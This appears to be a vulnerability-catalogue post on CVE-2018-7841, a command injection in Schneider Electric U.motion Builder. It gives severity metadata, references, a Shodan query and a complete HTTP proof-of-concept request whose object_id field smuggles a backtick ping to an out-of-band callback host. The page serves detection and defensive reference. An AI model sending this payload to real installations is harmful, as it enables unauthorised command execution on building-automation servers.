---
layout: post
cve_id: CVE-2018-7841
title: Schneider Electric U.motion Builder - Remote Code Execution
pcap: true
pcap_path: /pcaps/2018/CVE-2018-7841.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2018/CVE-2018-7841.yaml
snort2_rule: N/A
snort3_rule: N/A
author: darses,rcesecurity
severity: critical
impact: 'Attackers can execute arbitrary system commands on the server, potentially
  leading to complete system compromise, data theft, service disruption, or lateral
  movement within the network.

  '
remediation: 'The product has been retired and is no longer available or supported.
  To further protect their installations from this threat, customers should immediately
  remove the U.motion Builder software from their systems.

  '
reference:
- https://www.exploit-db.com/exploits/46846
- https://packetstorm.news/files/id/152862
- https://www.rcesecurity.com/2019/05/cve-2018-7841-schneider-electric-umotion-builder-remote-code-execution-0-day
- https://download.schneider-electric.com/files?p_Doc_Ref=SEVD-2017-178-01&p_enDocType=Security+and+Safety+Notice&p_File_Name=SEVD-2019-071-02-Umotion-Builder.pdf
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2018-7841
  cwe-id: CWE-78
  epss-score: 0.53349
  epss-percentile: 0.97876
  cpe: cpe:2.3:a:schneider-electric:u.motion_builder:1.3.4:*:*:*:*:*:*:*
metadata:
  verified: true
  max-requests: 1
  vendor: schneider-electric
  product: u.motion_builder
  shodan-query: http.headers_hash:1985490094
tags:
- cve
- cve2018
- schneider-electric
- rce
- kev
- oast
- oob
- vkev
- vuln
---

## üîç Vulnerability Description
U.motion Builder 1.3.4 contains a remote code execution vulnerability caused by improper input sanitization, allowing attackers to execute arbitrary system commands through crafted input parameters.


## üåê HTTP Request
```nohighlight
POST /umotion/modules/reporting/track_import_export.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15
Connection: close
Content-Length: 102
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
op=export&language=english&interval=1&object_id=`ping -c 1 d5j0jh9le0o4sa1hvio0mm98hzh5wcf4t.oast.fun`
```

